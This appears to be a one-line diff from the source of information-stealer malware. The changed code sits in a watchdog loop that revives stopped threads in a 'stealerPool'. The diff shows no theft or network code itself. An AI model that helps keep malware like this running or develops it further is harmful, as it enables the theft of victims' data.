@@ -36,7 +36,7 @@ namespace sub
                 //Restart them if they did (unless they are meant to run once)
                 foreach(StealerThread st in Variables.stealerPool)
                 {
-                    if (st.GetDelay() <= 0) continue; //If it is meant to run once, don't revive
+                    if (st.GetDelay() < 1) continue; //If it is meant to run once, don't revive
                     if(st.GetStealerThread().ThreadState != ThreadState.Running
                         && st.GetStealerThread().ThreadState != ThreadState.WaitSleepJoin)
                     {
